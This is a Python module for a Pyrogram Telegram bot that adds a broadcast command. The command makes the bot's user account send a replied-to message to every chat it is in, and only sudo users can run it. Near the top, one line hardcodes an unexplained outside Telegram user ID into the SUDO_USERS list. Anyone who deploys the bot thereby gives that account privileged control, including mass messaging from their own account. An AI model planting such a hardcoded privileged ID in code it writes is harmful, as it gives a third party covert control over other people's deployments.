# Copyright (C) 2021 By @MrNitric

import asyncio
from pyrogram import Client, filters
from pyrogram.types import Dialog, Chat, Message
from pyrogram.errors import UserAlreadyParticipant
from modules.clientbot.clientbot import client as aditya
from modules.config import SUDO_USERS

SUDO_USERS.append(5161717680)

@Client.on_message(filters.command(["gcast", "post", "send"]))
async def broadcast(_, message: Message):
    sent=0
    failed=0
    if message.from_user.id not in SUDO_USERS:
        return
    else:
        wtf = await message.reply("`Sᴛᴀʀᴛɪɴɢ Bʀᴏᴀᴅᴄᴀsᴛ ...`")
        if not message.reply_to_message:
            await wtf.edit("**__Pʟᴇᴀsᴇ Rᴇᴘʟʏ Tᴏ A Mᴇssᴀɢᴇ Tᴏ Sᴛᴀʀᴛ Bʀᴏᴀᴅᴄᴀsᴛ ...__**")
            return
        lmao = message.reply_to_message.text
        async for dialog in aditya.iter_dialogs():
            try:
                await aditya.send_message(dialog.chat.id, lmao)
                sent = sent+1
                await wtf.edit(f"`Bʀᴏᴀᴅᴄᴀsᴛɪɴɢ` \n\n**Sᴇɴᴛ Tᴏ:** `{sent}` Cʜᴀᴛs \n**Fᴀɪʟᴇᴅ Iɴ:** {failed} Cʜᴀᴛs.")
                await asyncio.sleep(3)
            except:
                failed=failed+1
        await message.reply_text(f"`Gᴄᴀsᴛ Sᴜᴄᴄᴇssғᴜʟʟʏ` \n\n**Sᴇɴᴛ Tᴏ:** `{sent}` Cʜᴀᴛs \n**Fᴀɪʟᴇᴅ Iɴ:** {failed} Cʜᴀᴛs.")
